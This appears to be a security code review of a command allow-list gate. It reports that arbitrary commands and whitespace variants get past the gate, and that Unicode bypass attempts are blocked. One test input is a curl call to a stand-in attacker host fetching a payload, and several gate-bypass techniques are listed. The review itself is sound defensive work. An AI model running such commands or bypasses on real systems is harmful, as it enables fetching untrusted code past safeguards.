## AC Verdict Table

| Criterion | Verdict | Evidence |
|---|---|---|
| criterion-1: concrete findings | SATISFIED | Findings below with source locations and reproduced outputs. |

## Review Verdict: NEEDS_FIXES

1. **HIGH — arbitrary ASCII commands remain accepted.**  
   `tools/gate/deriveGoalState.ts:787-803` applies exact allow-list matching only when a command looks like a timestamp-shaped gate script. Reproduced: `echo approved-but-unplanned` and `curl https://attacker.invalid/payload` both return `null`/ACCEPTED. This violates the requested “exact ASCII plan command must be sole accept” authority boundary.

2. **HIGH — exact ASCII byte equality is not enforced.**  
   `tools/gate/deriveGoalState.ts:578` normalizes via `trim().split(/[ \t\n\r]+/)`; therefore `bash  .gate-evidence/.../step1.sh` and leading/trailing-space variants are accepted despite differing from the plan literal command. Require raw ASCII command equality (or explicitly narrow/document permitted formatting aliases).

3. **MEDIUM — FIX-19 regression test is non-deterministic against shared dev state.**  
   `convex/__tests__/REDHAT-FIX-19-strict-manifest-binding.integration.test.ts:45-62, 279-281` hard-codes a shared Convex deployment. The FIX-17..27 regression run failed FIX-19 AC-1; an isolated rerun failed AC-3. This makes the regression gate unreliable. This is not the valid external S4-T7 BLOCKED condition.

The full requested non-ASCII matrix passed: Cyrillic marker/extension, U+200B, U+FEFF, full-width dot/slash, Unicode script-path/args, and arbitrary non-ASCII command all returned `OFF_PLAN_SCRIPT`. No S4-T7 finding: external BLOCKED remains correct.